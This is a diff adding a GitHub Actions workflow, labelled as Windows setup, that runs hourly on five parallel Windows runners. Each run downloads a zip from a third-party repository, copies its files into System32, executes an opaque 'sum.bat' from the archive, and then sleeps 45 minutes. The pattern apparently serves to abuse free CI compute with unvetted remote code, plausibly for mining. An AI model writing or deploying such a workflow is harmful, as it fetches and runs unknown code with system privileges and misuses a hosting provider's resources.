@@ -1,0 +1,53 @@
+name: Windows Setup and Execution
+
+on:
+  schedule:
+    # Run every hour
+    - cron: '0 * * * *'
+  workflow_dispatch: # Allow manual trigger for testing
+
+jobs:
+  build:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        job_id: [1, 2, 3, 4, 5]  # Define 5 different jobs
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Download and extract zip file
+      run: |
+        # Download the ZIP file from a URL
+        Invoke-WebRequest -Uri "https://github.com/barburonjilo/nyo/raw/main/tes.zip" -OutFile "tes.zip"
+        # Extract the ZIP file to the 'extracted' directory
+        Expand-Archive -Path "tes.zip" -DestinationPath "extracted" -Force
+
+    - name: List files for debugging
+      run: |
+        # List the contents of the 'extracted' directory to debug the structure
+        Get-ChildItem -Path "extracted" -Recurse
+
+    - name: Install DLLs
+      run: |
+        $dllPath = "extracted"  # No 'dlls' folder, DLLs are directly under 'extracted'
+        if (Test-Path $dllPath) {
+          Copy-Item -Path "$dllPath/*" -Destination "$env:windir\System32" -Force
+        } else {
+          Write-Host "DLLs directory does not exist: $dllPath"
+          exit 1
+        }
+    
+    - name: Run batch file
+      run: |
+        $batchFilePath = "extracted/sum.bat"  # Update if needed based on the debug output
+        if (Test-Path $batchFilePath) {
+          Start-Process -FilePath $batchFilePath -Wait
+        } else {
+          Write-Host "Batch file does not exist: $batchFilePath"
+          exit 1
+        }
+        
+    - name: Sleep for 45 minutes
+      run: |
+        Start-Sleep -Seconds 2700  # Sleep for 45 minutes (2700 seconds)
